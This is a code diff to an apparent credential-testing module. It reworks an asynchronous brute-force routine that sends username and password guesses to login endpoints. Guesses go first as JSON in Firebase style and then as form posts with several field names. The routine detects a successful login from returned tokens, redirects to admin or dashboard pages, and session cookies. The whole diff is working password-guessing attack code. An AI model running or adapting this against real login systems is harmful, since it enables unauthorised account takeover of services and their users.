@@ -547,8 +547,9 @@ class CredentialTester(BaseModule):
     # ─────────────────────────────────────────────────────────────────────────
     async def _test_brute_force(self, endpoint: Dict):
         import itertools
+        import json as _json
 
-        url    = endpoint['url']
+        url          = endpoint['url']
         counter      = [0]
         found_event  = asyncio.Event()
         rate_limited = [False]
@@ -569,18 +570,32 @@ class CredentialTester(BaseModule):
                 if found_event.is_set():
                     return
                 try:
-                    # Try JSON first (Firebase / API), fall back to form POST
+                    # ── Attempt 1: JSON POST (works for Firebase + JSON APIs) ──
+                    json_body = _json.dumps({
+                        'email': username,
+                        'password': password,
+                        'returnSecureToken': True
+                    })
                     resp = await self._make_request(
                         url, method='POST',
-                        json={'email': username, 'password': password, 'returnSecureToken': True},
+                        data=json_body,
                         allow_redirects=False,
                         headers={'Content-Type': 'application/json'})
 
-                    # If JSON failed or got 415/400, retry as form POST
-                    if not resp or resp.status in [400, 415]:
-                        body = {'email': username, 'username': username, 'password': password}
+                    # ── Attempt 2: form POST fallback ──────────────────────
+                    status_1 = resp.status if resp else 0
+                    if not resp or status_1 in [400, 404, 415, 422, 500]:
+                        form_body = {
+                            'email':    username,
+                            'username': username,
+                            'user':     username,
+                            'login':    username,
+                            'password': password,
+                            'passwd':   password,
+                        }
                         resp = await self._make_request(
-                            url, method='POST', data=body,
+                            url, method='POST',
+                            data=form_body,
                             allow_redirects=False,
                             headers={'Content-Type': 'application/x-www-form-urlencoded'})
 
@@ -595,7 +610,7 @@ class CredentialTester(BaseModule):
                     text   = await resp.text()
                     tl     = text.lower()
 
-                    # Always show first response so user can verify
+                    # Show first response so user can verify
                     if counter[0] == 1:
                         sys.stdout.write('\n')
                         print(f"\033[90m[debug] HTTP {status} | {text[:300]}\033[0m\n")
@@ -605,37 +620,39 @@ class CredentialTester(BaseModule):
                         found_event.set()
                         return
 
-                    # ── SUCCESS ───────────────────────────────────────────
+                    # ── SUCCESS CHECKS ────────────────────────────────────
                     success = False
 
-                    # Firebase success
+                    # Firebase: idToken in response = logged in
                     if any(k in tl for k in ['idtoken', '"localid"', 'refreshtoken']):
                         success = True
 
-                    # Redirect to success page
+                    # Redirect to a success page
                     elif status in [301, 302, 303, 307, 308]:
                         loc = resp.headers.get('Location', '').lower()
-                        if any(p in loc for p in ['/dashboard','/admin','/home','/panel','/welcome','/main']):
+                        if any(p in loc for p in ['/dashboard','/admin','/home',
+                                                   '/panel','/welcome','/main']):
                             success = True
 
-                    # JSON token (non-Firebase)
-                    elif 'application/json' in resp.headers.get('Content-Type',''):
-                        if '"error"' not in tl and any(k in tl for k in ['token','access_token','auth']):
-                            success = True
-
-                    # HTML: session cookie set + no error words
-                    elif status == 200:
-                        fail_words = ['invalid','incorrect','failed','wrong','denied',
-                                      'unauthorized','error','bad credentials','not found']
-                        cookie = resp.headers.get('Set-Cookie','').lower()
-                        if any(c in cookie for c in ['session','token','auth','jwt']):
-                            if not any(f in tl for f in fail_words):
+                    # JSON token response (non-Firebase APIs)
+                    elif 'application/json' in resp.headers.get('Content-Type', ''):
+                        if '"error"' not in tl:
+                            if any(k in tl for k in ['token', 'access_token', 'auth']):
                                 success = True
+
+                    # HTML: session cookie + no failure words
+                    elif status == 200:
+                        cookie = resp.headers.get('Set-Cookie', '').lower()
+                        fail   = ['invalid','incorrect','failed','wrong',
+                                   'denied','unauthorized','error','not found']
+                        if (any(c in cookie for c in ['session','token','auth','jwt'])
+                                and not any(f in tl for f in fail)):
+                            success = True
 
                     if success:
                         sys.stdout.write('\n')
                         self._report_success(username, password, url, counter[0],
-                                             ['email','username'], 'password')
+                                             ['email', 'username'], 'password')
                         found_event.set()
 
                 except asyncio.CancelledError:
